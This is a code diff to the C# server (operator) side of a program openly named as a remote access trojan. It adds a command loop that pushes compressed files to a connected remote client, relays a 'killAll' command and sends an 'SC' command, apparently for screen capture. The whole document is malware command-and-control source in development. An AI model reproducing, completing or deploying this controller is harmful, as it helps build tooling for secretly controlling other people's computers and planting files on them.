@@ -6,6 +6,7 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Net.Sockets;
 using System.IO;
+using System.IO.Compression;
 
 namespace RAT_test_serverside
 {
@@ -15,7 +16,7 @@ namespace RAT_test_serverside
         private static TcpListener listener;
         private static TcpClient client;
 
-        private static bool keepAlive;
+        private static bool keepAlive = true;
 
         static void Main(string[] args)
         {
@@ -37,16 +38,14 @@ namespace RAT_test_serverside
                     //Get the data and print it out
                     string data = sr.ReadLine();
                     Console.WriteLine("Connected to: " + data);
-                    keepAlive = true;
 
                 }
                 catch (Exception e)
                 {
                     Console.WriteLine(e);
-                    keepAlive = false;
                 }
 
-                while (keepAlive)
+                while (keepAlive && client.Connected)
                 {
                     Console.WriteLine();
                     Console.WriteLine("Enter Command:");
@@ -66,20 +65,41 @@ namespace RAT_test_serverside
 
                     if (cmd.StartsWith("S"))
                     {
-                        string[] sendArgs = cmd.Split(null);
+                        string[] sendArgs = cmd.Split(Convert.ToChar("*"));
 
                         FileStream fs = new FileStream(sendArgs[1], FileMode.Open, FileAccess.Read);
-                        byte[] data = readToBytes(fs);
+                        byte[] data = compressBytes(readToBytes(fs));
+                        Console.WriteLine(data.Length);
 
-                        string dataString = string.Join("+", data);
-                        Console.WriteLine("Sending File: " + sendArgs[1]);
-                        sw.WriteLine("S_" + sendArgs[1] + "_" + dataString);
+                        sw.WriteLine("S*" + sendArgs[2]);
+                        sw.Flush();
+                        
+                        sw.WriteLine(data.Length); //Send the file size
                         sw.Flush();
 
-                        //Dispose everything
-                        fs.Dispose();
-                        dataString = String.Empty;
-                        Array.Clear(data,0,data.Length);
+                        foreach (byte b in data)
+                        {
+                            sw.WriteLine(b);
+                        } 
+                        sw.Flush();
+                    }
+
+                    if (cmd.StartsWith("killAll"))
+                    {
+                        Console.WriteLine("Sending: " + cmd);
+                        sw.WriteLine(cmd);
+                        sw.Flush();
+                    }
+
+                    if (cmd.StartsWith("C"))
+                    {
+                        try
+                        {
+                            Console.WriteLine("Sending SC Command!");
+                            sw.WriteLine(cmd);
+                            sw.Flush();
+                        }
+                        catch (Exception e) { }
                     }
 
                     //Get data
@@ -98,6 +118,7 @@ namespace RAT_test_serverside
                     } catch(Exception e) { }
                 }
                 client.Close();
+                Console.WriteLine("Client Disconnect");
             }
         }
 
@@ -109,6 +130,16 @@ namespace RAT_test_serverside
                 return ms.ToArray();
                 ms.SetLength(0);
             }
+        }
+
+        public static byte[] compressBytes(byte[] data)
+        {
+            MemoryStream ms = new MemoryStream();
+            using (DeflateStream ds = new DeflateStream(ms, CompressionLevel.Optimal))
+            {
+                ds.Write(data, 0, data.Length);
+            }
+            return ms.ToArray();
         }
 
     }
